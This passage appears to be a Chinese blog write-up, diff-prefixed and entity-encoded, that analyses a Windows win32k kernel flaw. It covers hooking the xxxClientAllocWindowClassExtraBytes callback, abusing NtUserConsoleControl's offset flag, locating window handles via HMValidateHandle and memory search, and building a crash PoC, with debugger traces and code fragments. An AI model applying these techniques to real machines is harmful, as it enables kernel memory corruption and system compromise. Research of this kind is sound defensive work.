+<p>User32!_xxxClientAllocWindowClassExtraBytes&#x51FD;&#x6570;&#x4E2D;&#xFF0C;&#x8C03;&#x7528;RtlAllocateHeap&#x7533;&#x8BF7;&#x5806;&#x5185;&#x5B58;&#xFF0C;&#x5E76;&#x901A;&#x8FC7;&#x8C03;&#x7528;User32!NtCallbackReturn&#x5C06;&#x8FD4;&#x56DE;&#x5185;&#x6838;&#x51FD;&#x6570;&#xFF0C;&#x800C;&#x7533;&#x8BF7;&#x7684;&#x7528;&#x6237;&#x6A21;&#x5F0F;&#x5185;&#x5B58;&#x5730;&#x5740;&#x548C;&#x5927;&#x5C0F;&#x5373;&#x4E3A;KeUserModeCallback&#x7B2C;&#x56DB;&#x548C;&#x7B2C;&#x4E94;&#x53C2;&#x6570;&#x3002;&#x62FF;&#x5230;&#x83B7;&#x5F97;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x5199;&#x5165;*(tagWND+5*8)+0x128&#x5B57;&#x6BB5;&#x3002;</p>
+<p>&#x5728;&#x5229;&#x7528;&#x6837;&#x672C;&#x4E2D;&#xFF0C;&#x5B58;&#x5728;&#x53E6;&#x5916;&#x4E00;&#x4E2A;&#x5173;&#x952E;&#x7684;&#x51FD;&#x6570;win32u!NtUserConsoleControl&#x3002;&#x6B64;&#x51FD;&#x6570;&#x7ECF;&#x8FC7;&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#x8FDB;&#x5165;&#x5185;&#x6838;&#x4E2D;&#xFF0C;&#x8C03;&#x7528;win32kfull!NtUserConsoleControl&#x51FD;&#x6570;&#x3002;&#x540E;&#x8005;&#x5185;&#x90E8;&#x8C03;&#x7528;win32kfull!xxxConsoleControl&#x51FD;&#x6570;&#x3002;</p>
+<p><img src="/2021/03/16/20210316-1/1614242158626.png" alt="1614242158626"></p>
+<p>win32kfull!xxxConsoleControl&#x51FD;&#x6570;&#x4E2D;&#xFF0C;&#x4F1A;&#x5C06;*(tagWnd+0x28)+0x128&#x5904;&#x7684;&#x503C;&#x4FEE;&#x6539;&#x4E3A;&#x4E00;&#x4E2A;offset,&#x8BA1;&#x7B97;&#x65B9;&#x5F0F;&#x4E3A;offset = DesktopAlloc&#x503C;-&#x539F;&#x672C;&#x5B58;&#x5728;&#x7684;pointer&#x503C;&#xFF0C;&#x540C;&#x65F6;&#xFF0C;&#x8BBE;&#x7F6E;*(tagWnd+0x28)+0xE8&#x5904;&#x7684;&#x503C;&#xFF0C;&#x52A0;&#x4E0A;0x800&#x6807;&#x5FD7;&#xFF0C;&#x53EF;&#x4EE5;&#x7406;&#x89E3;&#x4E3A;&#x4E00;&#x4E2A;flag&#xFF0C;&#x610F;&#x5473;&#x7740;&#x5F53;&#x524D;extra data&#x5730;&#x5740;&#x7684;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x53D8;&#x4E3A;offset&#x65B9;&#x5F0F;&#x3002;</p>
+<p><img src="/2021/03/16/20210316-1/1614322205853.png" alt="1614322205853"></p>
+<p>&#x5F53;User32!_xxxClientAllocWindowClassExtraBytes&#x51FD;&#x6570;&#x88AB;Hook&#x4E3A;&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;&#xFF0C;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;</p>
+<p><img src="/2021/03/16/20210316-1/1615289171455.png" alt="1615289171455"></p>
+<p>&#x9996;&#x5148;&#x8C03;&#x7528;win32u!NtUserConsoleControl&#x51FD;&#x6570;&#x5C06;&#x7A97;&#x53E3;&#x7684;extradata&#x5730;&#x5740;&#x4FEE;&#x6539;&#x4E3A;offset,&#x8BBE;&#x7F6E;flag|=0x800&#xFF0C;&#x5373;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x53D8;&#x4E3A;offset&#x65B9;&#x5F0F;&#x3002;&#x63A5;&#x7740;&#x4F7F;&#x7528;ntdll!NtCallbackReturn&#x51FD;&#x6570;&#xFF0C;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;<font color="Red">fake_offset</font>&#x503C;&#xFF0C;&#x5F53;&#x540E;&#x7EED;&#x5185;&#x6838;&#x4EE3;&#x7801;&#x4F7F;&#x7528;&#x5230;&#x6B64;fake_offset&#x503C;&#x53EF;&#x9020;&#x6210;&#x5185;&#x5B58;&#x8D8A;&#x754C;&#x8BBF;&#x95EE;&#xFF0C;&#x5F53;&#x8BBF;&#x95EE;&#x5230;&#x5185;&#x5B58;&#x4E3A;&#x65E0;&#x6548;&#x5185;&#x5B58;&#x65F6;&#xFF0C;&#x53EF;&#x9020;&#x6210;BSOD&#x3002;</p>
+<p>&#x4F46;&#x662F;<font color="Red">&#x5B58;&#x5728;&#x4E00;&#x4E2A;&#x95EE;&#x9898;</font>&#xFF0C;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x4E2D;&#xFF0C;&#x7A97;&#x53E3;&#x5E76;&#x672A;&#x521B;&#x5EFA;&#x5B8C;&#x6210;&#xFF0C;&#x6211;&#x4EEC;&#x65E0;&#x6CD5;&#x62FF;&#x5230;&#x5F53;&#x524D;&#x7A97;&#x53E3;&#x53E5;&#x67C4;&#xFF0C;&#x66F4;&#x522B;&#x63D0;&#x540E;&#x7EED;&#x8C03;&#x7528;NtUserConsoleControl&#x6765;&#x4FEE;&#x6539;flag&#x3002;</p>
+<p>&#x8FD9;&#x91CC;&#x6709;&#x4E24;&#x79CD;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#xFF0C;&#x7B2C;&#x4E00;&#x79CD;&#x662F;&#x5728;&#x5728;&#x91CE;&#x6837;&#x672C;&#x4E2D;&#x4F7F;&#x7528;&#x7684;&#x5229;&#x7528;HMValidateHandle&#x83B7;&#x53D6;&#x7A97;&#x53E3;&#x5BF9;&#x8C61;&#x5185;&#x6838;&#x7ED3;&#x6784;&#x6620;&#x5C04;&#x5230;&#x7528;&#x6237;&#x5806;&#x7684;&#x5185;&#x5B58;&#x540E;&#xFF0C;&#x4F7F;&#x7528;VirtualQuery&#x51FD;&#x6570;&#xFF0C;&#x83B7;&#x53D6;&#x5185;&#x5B58;&#x4FE1;&#x606F;&#xFF0C;&#x7136;&#x540E;&#x591A;&#x6B21;&#x91CD;&#x590D;&#x540E;&#xFF0C;&#x627E;&#x5230;&#x7A97;&#x53E3;&#x5185;&#x5B58;&#x6620;&#x5C04;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x6700;&#x5C0F;&#x7684;&#x57FA;&#x5730;&#x5740;&#xFF0C;&#x901A;&#x8FC7;&#x66B4;&#x529B;&#x5185;&#x5B58;&#x641C;&#x7D22;&#xFF0C;&#x6839;&#x636E;&#x7A97;&#x53E3;&#x5BF9;&#x8C61;tagWND&#x7684;&#x6210;&#x5458;&#x8BBE;&#x7F6E;&#x7279;&#x6B8A;&#x503C;&#xFF0C;&#x67E5;&#x627E;&#x76EE;&#x6807;&#x7A97;&#x53E3;&#x503C;&#xFF0C;&#x518D;&#x6839;&#x636E;&#x7ED3;&#x6784;&#x4F53;&#x6210;&#x5458;&#x504F;&#x79FB;&#xFF0C;&#x7ED3;&#x6784;&#x4F53;&#x7B2C;&#x4E00;&#x6210;&#x5458;head&#x4E2D;&#x5B58;&#x5728;&#x53E5;&#x67C4;&#x503C;&#xFF0C;&#x83B7;&#x53D6;&#x7A97;&#x53E3;&#x53E5;&#x67C4;&#x3002;</p>
+<p>&#x7B2C;&#x4E8C;&#x79CD;&#xFF0C;&#x5728;kk&#x5E08;&#x5085;&#x5206;&#x4EAB;&#x7684;exploit&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x7C7B;&#x4F3C;&#x5806;&#x55B7;&#x7684;&#x601D;&#x60F3;&#xFF0C;&#x521B;&#x5EFA;&#x591A;&#x4E2A;&#x7A97;&#x53E3;&#xFF0C;&#x4F7F;&#x7528;&#x4E0D;&#x516C;&#x5F00;&#x7684;HMValidateHandle&#x83B7;&#x53D6;&#x7A97;&#x53E3;&#x5185;&#x6838;&#x5BF9;&#x8C61;tagWND&#x6620;&#x5C04;&#x7684;&#x7528;&#x6237;&#x5806;&#x90E8;&#x5206;&#xFF0C;&#x6211;&#x4EEC;&#x77E5;&#x9053;&#x4E86;&#x8FD9;&#x4E9B;&#x7528;&#x6237;&#x7A97;&#x53E3;&#x5BF9;&#x8C61;&#x7684;&#x5185;&#x5B58;&#x540E;&#xFF0C;&#x9500;&#x6BC1;&#x90E8;&#x5206;&#x7A97;&#x53E3;&#xFF0C;&#x4F46;&#x662F;&#x91CA;&#x653E;&#x7684;&#x7A97;&#x53E3;&#x7684;&#x5185;&#x5B58;&#x4F9D;&#x65E7;&#x5B58;&#x5728;&#xFF0C;&#x6211;&#x4EEC;&#x5728;&#x91CD;&#x65B0;&#x521B;&#x5EFA;&#x7A97;&#x53E3;&#x65F6;&#xFF0C;&#x4F18;&#x5148;&#x4F7F;&#x7528;&#x8FD9;&#x4E9B;&#x91CA;&#x653E;&#x7684;&#x7A97;&#x53E3;&#x5BF9;&#x8C61;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x7531;&#x4E8E;&#x7A97;&#x53E3;&#x5BF9;&#x8C61;&#x7B2C;&#x4E00;&#x6210;&#x5458;&#x4E3A;&#x7A97;&#x53E3;&#x7684;&#x53E5;&#x67C4;&#xFF0C;&#x6211;&#x4EEC;&#x5728;&#x6210;&#x5458;&#x8BBE;&#x7F6E;&#x4E00;&#x4E9B;&#x7279;&#x6B8A;&#x503C;&#xFF0C;&#x67E5;&#x627E;&#x5185;&#x5B58;&#x5373;&#x53EF;&#xFF0C;&#x5B9A;&#x4F4D;&#x5230;&#x65B0;&#x521B;&#x5EFA;&#x7684;&#x7A97;&#x53E3;&#x7684;&#x53E5;&#x67C4;&#x3002;</p>
+<p><font color="Red">&#x5206;&#x6790;&#x5230;&#x8FD9;&#x91CC;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;18362.1316&#x6784;&#x9020;&#x4E00;&#x4E2A;crash poc&#xFF0C;</font>&#x6D41;&#x7A0B;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;</p>
+<p><img src="/2021/03/16/20210316-1/1615295996624.png" alt="1615295996624"></p>
+<h4 id="3-&#x52A8;&#x6001;&#x5206;&#x6790;"><a href="#3-&#x52A8;&#x6001;&#x5206;&#x6790;" class="headerlink" title="3. &#x52A8;&#x6001;&#x5206;&#x6790;"></a>3. &#x52A8;&#x6001;&#x5206;&#x6790;</h4><p>&#x6B64;&#x6B21;&#x8C03;&#x8BD5;&#x83B7;&#x53D6;HWND&#x7684;&#x65B9;&#x5F0F;&#x4E3A;&#x7B2C;&#x4E00;&#x79CD;&#xFF0C;&#x5373;&#x901A;&#x8FC7;VirtualQuery&#x67E5;&#x8BE2;mbi&#x540E;&#xFF0C;&#x641C;&#x7D22;&#x5185;&#x5B58;&#x65B9;&#x5F0F;&#xFF0C;&#x53E6;&#x4E00;&#x79CD;&#x65B9;&#x5F0F;&#x5982;&#x524D;&#x6240;&#x8FF0;&#xFF0C;&#x66F4;&#x597D;&#x7406;&#x89E3;&#x3002;</p>
+<p>&#x9996;&#x5148;&#x83B7;&#x53D6;&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#x5730;&#x5740;&#x3002;</p>
+<p><img src="/2021/03/16/20210316-1/1615360497050.png" alt="1615360497050"></p>
+<p>&#x901A;&#x8FC7;IsMenu&#x51FD;&#x6570;&#x83B7;&#x53D6;HMValidateHandle&#x51FD;&#x6570;&#x5730;&#x5740;&#x3002;</p>
+<p><img src="/2021/03/16/20210316-1/1615360670476.png" alt="1615360670476"></p>
+<p>&#x901A;&#x8FC7;gs:[60h]&#x83B7;&#x53D6;PEB&#x5730;&#x5740;&#xFF0C;&#x8BBF;&#x95EE;PEB+0x58&#x6210;&#x5458;&#xFF0C;&#x5373;KernelCallbackTable&#x5730;&#x5740;&#xFF0C;table&#x7684;&#x7B2C;0x7b&#x6210;&#x5458;&#x5373;&#x6211;&#x4EEC;&#x7684;&#x76EE;&#x6807;&#x56DE;&#x8C03;&#x51FD;&#x6570;User32!_xxxClientAllocWindowClassExtraBytes&#x3002;</p>
+<p><img src="/2021/03/16/20210316-1/1615360939325.png" alt="1615360939325"></p>
+<p>Hook&#x8FD9;&#x4E2A;&#x5730;&#x5740;&#x540E;&#xFF0C;&#x5219;&#x8F6C;&#x4E3A;&#x6211;&#x4EEC;&#x7684;&#x81EA;&#x5B9A;&#x4E49;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x3002;</p>
+<p><img src="/2021/03/16/20210316-1/1615361008031.png" alt="1615361008031"></p>
+<p><img src="/2021/03/16/20210316-1/1615361883275.png" alt="1615361883275"></p>
+<p>&#x751F;&#x6210;&#x4E00;&#x4E2A;magic_value&#xFF0C;&#x8FD9;&#x91CC;random&#x503C;&#x6A21;&#x4E0A;0xFF+0x1234&#x6216;1&#x7684;&#x5947;&#x6570;&#x503C;&#xFF0C;&#x6B64;&#x65F6;&#x4E3A;0x12c1&#x3002;&#x540E;&#x7EED;&#x521B;&#x5EFA;&#x4E24;&#x4E2A;&#x7A97;&#x53E3;&#x7C7B;&#xFF0C;&#x4E00;&#x4E2A;WndClassExW.cbWndExtra&#x4E3A;&#x6B63;&#x5E38;&#x503C;0x20,&#x53E6;&#x4E00;&#x4E2A;WndClassExW.cbWndExtra&#x4E3A;magic_value&#x3002;</p>
+<p>&#x521B;&#x5EFA;&#x6B63;&#x5E38;&#x7A97;&#x53E3;&#x3002;</p>
+<p><img src="/2021/03/16/20210316-1/1615362694800.png" alt="1615362694800"></p>
+<p>&#x4F7F;&#x7528;HMValidateHandle&#x83B7;&#x53D6;&#x7A97;&#x53E3;&#x5BF9;&#x8C61;&#x5185;&#x6838;&#x7ED3;&#x6784;&#x6620;&#x5C04;&#x7684;&#x7528;&#x6237;&#x6A21;&#x5F0F;&#x5730;&#x5740;&#xFF0C;&#x7B2C;&#x4E00;&#x6210;&#x5458;&#x4E3A;_THRDESKHEAD Head&#x7ED3;&#x6784;&#xFF0C;&#x67E5;&#x770B;&#x4E0B;&#x9762;&#x7684;&#x6210;&#x5458;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#xFF0C;&#x7B2C;&#x4E00;&#x6210;&#x5458;&#x6307;&#x5411;&#x7684;&#x5185;&#x5B58;&#x4E3A;&#x7A97;&#x53E3;&#x53E5;&#x67C4;&#x3002;</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _THROBJHEAD</span><br><span class="line">win32k!_THROBJHEAD</span><br><span class="line">   +<span class="number">0x000</span> h                : Ptr64 Void</span><br><span class="line">   +<span class="number">0x008</span> <span class="keyword">cLockObj </span>        : Uint<span class="number">4B</span></span><br><span class="line">   +<span class="number">0x010</span> pti              : Ptr64 tagTHREADINFO</span><br><span class="line">   </span><br><span class="line">   typedef struct _THRDESKHEAD {</span><br><span class="line">	THROBJHEAD  thread<span class="comment">;</span></span><br><span class="line">	<span class="comment">/*0x14*/</span>DESKHEAD    deskhead<span class="comment">;</span></span><br><span class="line">} THRDESKHEAD, *PTHRDESKHEAD<span class="comment">;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">VirtualQuery(v6, &amp;Buffer, <span class="number">0</span>x30i64);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">__BaseAddress</span> == NULL)</span><br><span class="line">{</span><br><span class="line"><span class="variable">__BaseAddress</span> = Buffer.BaseAddress;</span><br><span class="line"><span class="variable">__RegionSize</span> = Buffer.RegionSize;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">__BaseAddress</span> &gt;= Buffer.BaseAddress)<span class="comment">//&#x5BFB;&#x627E;&#x6700;&#x5C0F;&#x7684;&#x57FA;&#x5730;&#x5740;</span></span><br><span class="line">{</span><br><span class="line"><span class="variable">__BaseAddress</span> = Buffer.BaseAddress;</span><br><span class="line"><span class="variable">__RegionSize</span> = Buffer.RegionSize;</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+<p>&#x901A;&#x8FC7;VirtualQuery&#x51FD;&#x6570;&#xFF0C;&#x6211;&#x4EEC;&#x83B7;&#x53D6;&#x5185;&#x5B58;&#x9875;&#x4FE1;&#x606F;&#xFF0C;&#x7B2C;&#x4E8C;&#x53C2;&#x6570;mbi&#x7ED3;&#x6784;&#x5982;&#x4E0B;&#x3002;</p>
+<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _MEMORY_BASIC_INFORMATION {</span><br><span class="line">  /*0x00*/<span class="type">PVOID</span>  <span class="type">BaseAddress</span>;</span><br><span class="line">  /*0x08*/<span class="type">PVOID</span>  <span class="type">AllocatizonBase</span>;</span><br><span class="line">  /*0x10*/<span class="type">DWORD</span>  <span class="type">AllocationProtect</span>;</span><br><span class="line">  /*0x14*/<span class="type">WORD</span>   <span class="type">PartitionId</span>;/*size = 4 &#x5BF9;&#x9F50;*/</span><br><span class="line">  /*0x18*/<span class="type">SIZE_T</span> <span class="type">RegionSize</span>;</span><br><span class="line">  /*0x20*/<span class="type">DWORD</span>  <span class="type">State</span>;</span><br><span class="line">  /*0x24*/<span class="type">DWORD</span>  <span class="type">Protect</span>;</span><br><span class="line">  /*0x28*/<span class="type">DWORD</span>  <span class="type">Type</span>;/*size = 8 &#x5BF9;&#x9F50;*/</span><br><span class="line">} <span class="type">MEMORY_BASIC_INFORMATION</span>, *<span class="type">PMEMORY_BASIC_INFORMATION</span>;</span><br></pre></td></tr></table></figure>
+
+<p>&#x5FAA;&#x73AF;&#x591A;&#x6B21;&#x521B;&#x5EFA;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x62FF;&#x5230;&#x7528;&#x6237;&#x5806;&#x7A97;&#x53E3;&#x5BF9;&#x8C61;&#x7533;&#x8BF7;&#x5185;&#x5B58;&#x7684;&#x6700;&#x5C0F;&#x57FA;&#x5730;&#x5740;&#x4EE5;&#x53CA;RegionSize&#x5927;&#x5C0F;&#x3002;</p>
+<p><img src="/2021/03/16/20210316-1/1615364228733.png" alt="1615364228733"></p>
+<p>&#x9500;&#x6BC1;&#x90E8;&#x5206;&#x7A97;&#x53E3;&#xFF0C;&#x4FBF;&#x4E8E;&#x5185;&#x5B58;&#x5206;&#x914D;&#x5230;&#x91CA;&#x653E;&#x7A97;&#x53E3;&#x9644;&#x8FD1;&#x3002;</p>
+<p>&#x521B;&#x5EFA;magic&#x7A97;&#x53E3;&#x3002;&#x7531;&#x4E8E;&#x5176;&#x8BBE;&#x7F6E;&#x91CC;magic_value&#xFF0C;&#x81EA;&#x7136;&#x8FDB;&#x5165;&#x6211;&#x4EEC;&#x81EA;&#x5B9A;&#x4E49;&#x4E2D;&#x7684;&#x53EF;&#x63A7;&#x90E8;&#x5206;&#x3002;</p>
+<p><img src="/2021/03/16/20210316-1/1615364635337.png" alt="1615364635337"></p>
+<p>&#x8C03;&#x7528;GethWndFromHeap&#x83B7;&#x53D6;magic&#x7A97;&#x53E3;&#x53E5;&#x67C4;&#x3002;&#x65B9;&#x6CD5;&#x4E00;&#xFF0C;&#x901A;&#x8FC7;&#x6211;&#x4EEC;&#x4E4B;&#x524D;&#x83B7;&#x53D6;&#x7684;&#x6700;&#x5C0F;&#x57FA;&#x5730;&#x5740;&#xFF0C;&#x641C;&#x7D22;&#x5185;&#x5B58;&#xFF0C;&#x67E5;&#x627E;magic_value&#xFF0C;&#x5B9A;&#x4F4D;&#x5230;magic&#x7A97;&#x53E3;&#x5BF9;&#x8C61;&#x6620;&#x5C04;&#x7684;&#x7528;&#x6237;&#x6A21;&#x5F0F;&#x5185;&#x5B58;&#x3002;</p>
+<p>&#x5F53;&#x4E00;&#x4E2A;Region&#x7684;&#x5185;&#x5B58;&#x67E5;&#x8BE2;&#x5B8C;&#x6BD5;&#x6216;&#x8005;&#x627E;&#x5230;magic&#x503C;&#xFF0C;&#x5224;&#x65AD;&#x5F53;&#x524D;&#x5185;&#x5B58;0x18&#x5904;&#x5373;tagWND.ExStyle&#x662F;&#x5426;&#x4E3A;&#x6211;&#x4EEC;&#x521B;&#x5EFA;&#x7A97;&#x53E3;&#x65F6;&#x8BBE;&#x7F6E;&#x7684;0x8000000&#x3002;&#x5F53;&#x4E0D;&#x4E3A;&#x6B64;&#x503C;&#x65F6;&#xFF0C;&#x5219;&#x8BF4;&#x660E;&#x6B64;&#x5904;&#x5185;&#x5B58;&#x5E76;&#x4E0D;&#x662F;&#x6211;&#x4EEC;&#x7684;&#x76EE;&#x6807;&#x5185;&#x5B58;&#xFF0C;&#x6216;&#x8005;&#x662F;&#x76EE;&#x6807;&#x5185;&#x5B58;&#xFF0C;&#x4F46;&#x662F;&#x9700;&#x8981;&#x5BF9;&#x9F50;&#x7ED3;&#x6784;&#x4F53;&#x3002;&#x524D;&#x4E00;&#x79CD;&#x60C5;&#x51B5;&#x7EE7;&#x7EED;&#x5916;&#x5C42;&#x5FAA;&#x73AF;&#xFF0C;&#x5F00;&#x59CB;&#x4E4B;&#x524D;&#xFF0C;&#x8C03;&#x6574;&#x6211;&#x4EEC;&#x7684;region_size&#x4E3A;&#x524D;&#x4E00;&#x6B21;&#x5FAA;&#x73AF;&#x4ECE;&#x672C;&#x6B21;&#x57FA;&#x5730;&#x5740;&#x5230;&#x5F53;&#x524D;&#x641C;&#x7D22;&#x5230;&#x5185;&#x5B58;&#x5730;&#x5740;&#x7684;&#x504F;&#x79FB;&#x5927;&#x5C0F;&#xFF1B;&#x540E;&#x4E00;&#x79CD;&#x60C5;&#x51B5;&#x76F4;&#x63A5;&#x62FF;&#x5BF9;&#x9F50;&#x7684;&#x5730;&#x5740;&#x8BBF;&#x95EE;&#x504F;&#x79FB;&#x5373;&#x53EF;&#x62FF;&#x5230;&#x6211;&#x4EEC;&#x7684;&#x76EE;&#x6807;&#x53E5;&#x67C4;&#x503C;&#x3002;</p>
+<p><img src="/2021/03/16/20210316-1/1615368744104.png" alt="1615368744104"></p>
+<p>&#x591A;&#x6B21;&#x5FAA;&#x73AF;&#x540E;&#xFF0C;&#x641C;&#x7D22;&#x5230;magic&#x503C;&#xFF0C;&#x4E5F;&#x5C31;&#x5B9A;&#x4F4D;&#x5230;&#x6211;&#x4EEC;&#x7684;magic&#x7A97;&#x53E3;&#x53E5;&#x67C4;&#x3002;</p>
+<p>&#x63A5;&#x7740;&#x5728;&#x81EA;&#x5B9A;&#x4E49;&#x6BC1;&#x6389;&#x4E2D;&#xFF0C;&#x8C03;&#x7528;NtUserConsoleControl&#x8BBE;&#x7F6E;magic&#x7A97;&#x53E3;&#x7684;flag&#x4EE5;&#x53CA;offset&#x503C;&#x3002;</p>
+<p><img src="/2021/03/16/20210316-1/1615369039846.png" alt="1615369039846"></p>
+<p>&#x8BBE;&#x7F6E;&#x53C2;&#x6570;&#x6761;&#x4EF6;&#x65AD;&#x70B9;&#x3002;</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ba </span>e1 win32kfull!NtUserConsoleControl <span class="string">&quot;j (rdx==00007ff7`72716120) &apos;&apos;; &apos;gc&apos; &quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x5185;&#x6838;&#x8C03;&#x8BD5;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x8FDB;&#x5165;win32kfull!xxxConsoleControl&#x51FD;&#x6570;&#xFF0C;&#x8BBE;&#x7F6E;offset&#x3002;</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">win32kfull!xxxConsoleControl+<span class="number">0x325</span>:</span><br><span class="line">fffff456`4591f8ed <span class="number">482b8880000000</span>  sub     rcx,qword ptr [rax+80h]</span><br><span class="line"><span class="number">3</span>: kd&gt; r rcx</span><br><span class="line">rcx=fffff423c1241040</span><br><span class="line"><span class="number">3</span>: kd&gt; ? rcx-poi(rax+<span class="number">80</span>)</span><br><span class="line">Evaluate expression: <span class="number">266304</span> = <span class="number">00000000</span>`<span class="number">00041040</span></span><br><span class="line"><span class="number">3</span>: kd&gt; p</span><br><span class="line">win32kfull!xxxConsoleControl+<span class="number">0x32c</span>:</span><br><span class="line">fffff456`4591f8f4 <span class="number">498b07</span>          mov     rax,qword ptr [r15]</span><br><span class="line"><span class="number">3</span>: kd&gt; r rcx</span><br><span class="line">rcx=<span class="number">0000000000041040</span></span><br><span class="line"><span class="number">3</span>: kd&gt; p</span><br><span class="line">win32kfull!xxxConsoleControl+<span class="number">0x32f</span>:</span><br><span class="line">fffff456`4591f8f7 <span class="number">48898828010000</span>  mov     qword ptr [rax+128h],rcx</span><br><span class="line"><span class="number">3</span>: kd&gt; dq rax+<span class="number">0x128</span></span><br><span class="line">fffff423`c123c2b8  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>: kd&gt; p</span><br><span class="line">win32kfull!xxxConsoleControl+<span class="number">0x336</span>:</span><br><span class="line">fffff456`4591f8fe e9fdfeffff      jmp     win32kfull!xxxConsoleControl+<span class="number">0x238</span> (fffff456`4591f800)</span><br><span class="line"><span class="number">3</span>: kd&gt; dq rax+<span class="number">0x128</span></span><br><span class="line">fffff423`c123c2b8  <span class="number">00000000</span>`<span class="number">00041040</span> <span class="number">00000000</span>`<span class="number">00000000</span>//&#x8BBE;&#x7F6E;offset=base-pointer</span><br></pre></td></tr></table></figure>
+
+<p>&#x4F7F;&#x7528;bts&#x6307;&#x4EE4;&#xFF0C;&#x8BBE;&#x7F6E;flag&#x6807;&#x5FD7;&#x4F4D;0x800&#x3002;</p>
+<p><img src="/2021/03/16/20210316-1/1615370785000.png" alt="1615370785000"></p>
+<p>&#x8FD4;&#x56DE;&#x81EA;&#x5B9A;&#x4E49;&#x56DE;&#x8C03;&#xFF0C;&#x8C03;&#x7528;NtCallbackReturn&#x51FD;&#x6570;&#xFF0C;&#x7B2C;&#x4E00;&#x53C2;&#x6570;&#x4E3A;&#x6211;&#x4EEC;&#x6839;&#x636E;magic&#x503C;&#x7533;&#x8BF7;&#x7684;&#x8FDB;&#x7A0B;&#x5806;&#x5185;&#x5B58;&#x5730;&#x5740;&#x3002;</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">crash_poc!_Fake_USER32_xxxClientAllocWindowClassExtraBytes+<span class="number">0</span>xa1:</span><br><span class="line"><span class="number">00007</span>ff7`<span class="number">72619d</span>b1 ff<span class="number">1551a21000</span>    call    qword ptr [crash_poc!_imp_HeapAlloc (<span class="number">00007</span>ff<span class="number">7`72724008</span>)] ds:<span class="number">00007</span>ff<span class="number">7`72724008</span>={ntdll!RtlAllocateHeap (<span class="number">00007</span>fff`<span class="number">2</span>a4baa20)}</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line">crash_poc!_Fake_USER32_xxxClientAllocWindowClassExtraBytes+<span class="number">0</span>xa7:</span><br><span class="line"><span class="number">00007</span>ff7`<span class="number">72619d</span>b7 <span class="number">48890572</span>c30f00  mov     qword ptr [crash_poc!__Offset (<span class="number">00007</span>ff<span class="number">7`72716130</span>)],rax ds:<span class="number">00007</span>ff<span class="number">7`72716130</span>=<span class="number">0000000000000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; r rax</span><br><span class="line">rax=<span class="number">00000146</span>cad82fd0</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dq rax</span><br><span class="line"><span class="number">00000146</span>`cad82fd0  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">00000146</span>`cad82fe0  <span class="number">00000000</span>`<span 